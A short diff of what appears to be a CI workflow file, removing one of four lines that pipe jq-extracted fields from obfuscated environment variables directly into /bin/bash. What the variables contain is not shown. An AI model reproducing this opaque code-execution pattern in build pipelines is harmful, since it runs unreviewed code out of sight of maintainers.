@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$pys78" | jq -r .pyfu9 | /bin/bash
           printf '%s' "$qcpe596" | jq -r .wm6 | /bin/bash
-          printf '%s' "$xly89442" | jq -r .rsxa50 | /bin/bash
           echo $re87 | jq -r .qmtc315 | /bin/bash
 
       - name: Save data
